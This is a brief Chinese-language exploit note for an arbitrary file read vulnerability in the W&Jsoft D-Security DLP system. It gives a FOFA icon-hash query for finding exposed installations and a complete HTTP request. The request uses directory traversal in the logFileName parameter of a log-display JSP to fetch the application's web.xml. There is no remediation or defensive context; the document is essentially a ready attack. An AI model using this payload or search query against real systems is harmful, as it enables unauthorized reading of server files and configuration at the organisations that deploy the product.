# W&Jsoft-D-Security数据仿泄露系统(DLP)存在任意文件读取漏洞
W&Jsoft-D-Security数据仿泄露系统(DLP)存在任意文件读取漏洞

## fofa
```javascript
icon_hash="616947260"
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1735566773129-315b9dc0-988c-47d2-a333-a2b6f4a7ec14.png)

## poc
```http
GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0, i
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Upgrade-Insecure-Requests: 1
```

![](https://cdn.nlark.com/yuque/0/2025/png/29512878/1735835640864-6262a6b5-db98-4860-a798-d2a539429bfa.png)

